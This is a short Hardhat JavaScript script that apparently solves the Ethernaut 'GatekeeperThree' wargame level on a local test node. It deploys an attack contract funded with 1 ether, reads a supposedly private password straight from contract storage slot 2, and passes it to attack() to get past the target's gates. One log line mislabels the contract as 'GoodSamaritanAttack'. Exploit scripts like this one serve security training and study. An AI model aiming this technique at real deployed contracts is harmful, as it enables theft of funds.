const { ethers } = require("hardhat");
const CONTRACT_ADDRESS = "0x6c615C766EE6b7e69275b0D070eF50acc93ab880";
const PLAYER_ADDRESS = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";
const SLOT_INDEX = 2;

async function main() {
  const provider = new ethers.providers.JsonRpcProvider(
    "http://localhost:8545"
  );
  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  // Deploy the GatekeeperThreeAttackFactory Contract
  const GatekeeperThreeAttackFactory = await ethers.getContractFactory(
    "GatekeeperThreeAttack",
    signer
  );
  const gatekeeperThreeAttack = await GatekeeperThreeAttackFactory.deploy(
    CONTRACT_ADDRESS,
    {
      value: ethers.utils.parseEther("1"),
    }
  );
  await gatekeeperThreeAttack.deployed();
  console.log(
    "GoodSamaritanAttack deployed to:",
    gatekeeperThreeAttack.address
  );
  await gatekeeperThreeAttack.callCreateTrick();
  console.log("Trick contract created");
  const trickAddress = await gatekeeperThreeAttack.getTrickAddress();
  console.log(trickAddress, "Trick contract address");
  // Read the value of the private password variable (slot 2)
  const value = await provider.getStorageAt(trickAddress, SLOT_INDEX);
  console.log(`Value of private password variable: ${value}`);

  await gatekeeperThreeAttack.attack(value);
}
main().catch((error) => {
  console.error(error);
  process.exit(1);
});
